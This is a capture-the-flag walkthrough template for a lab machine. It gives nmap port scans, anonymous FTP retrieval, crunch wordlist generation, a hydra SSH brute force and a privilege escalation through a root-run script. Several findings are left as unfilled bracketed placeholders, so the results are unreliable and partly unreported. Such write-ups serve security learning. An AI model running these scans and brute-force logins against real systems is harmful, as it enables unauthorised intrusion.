# HSBOX-1 — CTF Walkthrough

**Difficulty:** Easy / Medium

**Category:** Enumeration / FTP / Password Cracking / Privilege Escalation

**Date:** 2026-05

## Summary

Enumerated the target to find an exposed FTP service leaking a note,
used a generated wordlist to brute-force SSH credentials for a second
user, then escalated to root by abusing a script with elevated
permissions.

## 1. Reconnaissance

Confirmed the host was live, then scanned for open services — first a
quick scan, then a full port sweep to catch anything on non-standard
ports:

```
sudo nmap -sn <target-ip>            # host discovery
sudo nmap <target-ip>                # quick scan
sudo nmap <target-ip> -p-            # full port scan
```

The full scan revealed services on non-standard ports. I ran a focused
version/service scan on them:

```
sudo nmap -sV <target-ip> -p 21,1515,3535 -T4
sudo nmap <target-ip> -p 21 -A -T4
```

**Findings:** [list what nmap returned — e.g. 21/FTP, 1515/HTTP,
3535/SSH on a non-standard port]

## 2. FTP Enumeration

FTP was exposed, so I connected to check for anonymous access:

```
ftp <target-ip>
ftp> ls
ftp> get note.txt
```

Reviewing the file:

```
cat note.txt
```

**Key finding:** [explain what the note contained — e.g. a username,
a hint about a password format, etc.]

I also checked the web service for additional context:

```
firefox http://<target-ip>:1515/
```

**Result:** [what you found on the web page, or how it tied into the
note]

## 3. Gaining a Foothold — Password Cracking

The note hinted at a password pattern, so I generated a targeted
wordlist matching that format instead of using a generic one:

```
crunch 4 4 ac15 -o wl.txt
```

I then brute-forced the SSH login for the known user against that
wordlist:

```
hydra -l goblin -P wl.txt ssh://<target-ip>:3535 -t 32
```

Once Hydra recovered a valid credential, I logged in over SSH:

```
ssh goblin@<target-ip> -p 3535
```

*(Note: I first tried `ssh jack@<target-ip> -p 3535` earlier but did
not have valid credentials for that user — pivoting to `goblin` based
on the note's hint was the working path.)*

## 4. Privilege Escalation

After landing a shell, I searched the filesystem for a script
referenced [in the note / during enumeration]:

```
find / -name final.sh 2>/dev/null
```

This located a script in a shared directory:

```
cd /usr/share/hs/
cat final.sh
```

**Finding:** [explain what final.sh did and why it was exploitable —
e.g. it ran with root permissions and performed an action on a
user-controlled path]

I executed it to leverage that misconfiguration:

```
./final.sh /home/goblin/
```

## 5. Proof

```
cd
ls
cat flag.txt
```

Root access achieved. (Flag value omitted intentionally.)

## Lessons Learned

- Running a full port scan (`-p-`) is essential — the key services
  here were all on non-standard ports a default scan would miss.
- Anonymous FTP access leaking notes is a realistic and common
  misconfiguration.
- A targeted wordlist built from a known password pattern is far
  faster and more effective than a generic dictionary.
- Scripts that execute with elevated privileges on user-supplied
  input are a classic privilege-escalation vector — input handling
  and least privilege matter.
- [add one genuine takeaway in your own words]

## Tools Used

`nmap` · `ftp` · `crunch` · `hydra` · `ssh`

## Disclaimer

This walkthrough was completed in a legal lab/CTF environment for educational purposes only.
